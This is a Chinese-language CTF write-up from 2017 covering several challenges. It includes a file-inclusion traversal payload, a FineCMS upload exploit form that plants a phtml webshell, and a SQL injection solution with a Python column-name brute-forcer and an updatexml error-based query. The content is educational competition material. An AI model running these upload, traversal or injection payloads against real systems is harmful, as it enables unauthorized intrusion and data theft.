---
title: 2017 慕测安恒杯部分题 WriteUp
tags:
  - CTF
  - WriteUp
  - 文件包含
  - 编辑器泄露
date: 2017-07-12 10:20:13
---

6月18日的线上赛，今天才补上wp，9月22日更新SQL注入题
<!-- more -->

## 1.根据ip查dns解析记录

题目原意是让我们用cmd的nslookup命令，我直接上dns反查网站查的

到这个网站查dns解析[https://www.boip.net/ipv4/](https://www.boip.net/ipv4/)

flag为`this-is-flag`

## 3.编辑器泄露

题目提示编辑器泄露,fuzz后下载到了`login.php.swp`，用`vim -r login.php.swp`恢复得到源码，看到明文账号密码，
```php
if ($userin=="admin94wo")
if($passin=="ca1buda0mima7ah4ha")
```
用账号密码登录login.php得到flag，`flag{b4ckup_1s_normal}`

## 4.文件包含

fuzz后发现 &lt; 被过滤了，构造post file=.&lt;./.&lt;./.&lt;./.&lt;./.&lt;./flag 提交得到flag，`flag{To0_young_2_simple!}`

## 5.综合渗透

题目提示让我们复现exp，该站用的是`finecms`

百度得到此cms的一个上传漏洞，构造html文件如下，上传一个`phtml`后缀的一句话上去，菜刀连接在`/flag`得到flag，`flag{o1d_bug_t0_send_point!}`

```html
<!DOCTYPE html>
<html>
    <head>
    <meta charset=”utf-8″>
    <title>Finecms ajaxswfupload exp</title>
    </head>
    <body>
        <form action=”http://114.55.88.132:20580/index.php?c=attachment&a=ajaxswfupload” method=”POST” enctype=”multipart/form-data”>
            <input type=”file” name=”Filedata”>
            <input type=”hidden” name=”type” value=”phtml”>
            <input type=”hidden” name=”size” value=”100″>
            <input type=”submit” name=”submit” value=”上传文件”>
        </form>
    </body>
</html>
```

## 6.sql注入

这道题到最后也没做出来，报错注入注，过滤了`union`和`column_name`还有`*`，不知道字段名是啥

参考了[http://www.wupco.cn/?p=3764](http://www.wupco.cn/?p=3764)  
从该文章中可以得知这道注入题的核心代码如下
```php
$sql = "desc `error_{$table}`";
$res = mysql_query($sql);
if(empty(mysql_fetch_array($res))){
    echo "<center>no table detail</center>";
    die();
}

$sql = "select * from error_${table} where id = $id";
```
可以看出通过`desc`语句判断table是否存在，再执行下一个sql语句  
DESC的语法如下  
```
DESC tbl_name [col_name | wild]
```
构造payload如下  
```
http://114.55.36.69:20680/index.php?table=flag` `a%&id=3
```
python脚本如下
```python
#!/usr/bin/env
# -*- coding: utf-8 -*-
import requests as r
r1=r.session()
s="abcdefghijklmnopqrstuvwxyz1234567890_"
flag=""
for i in range(50):
  url="http://114.55.36.69:20680/index.php?table=flag` `{0}%&id=3"
  for j in s:
    url2=url.format(str(flag+j))
    r2=r1.get(url2)
    if "SQL" in r2.text:
      flag+=j
      print flag
      break
```
得到`error_flag`表的字段名为`flag_you_will_never_know`  
再使用报错注入查询即可拿到flag  
```
http://114.55.36.69:20680/index.php?table=news&id=3 -updatexml(1,concat('a=.',(select flag_you_will_never_know from error_flag)),1)#
```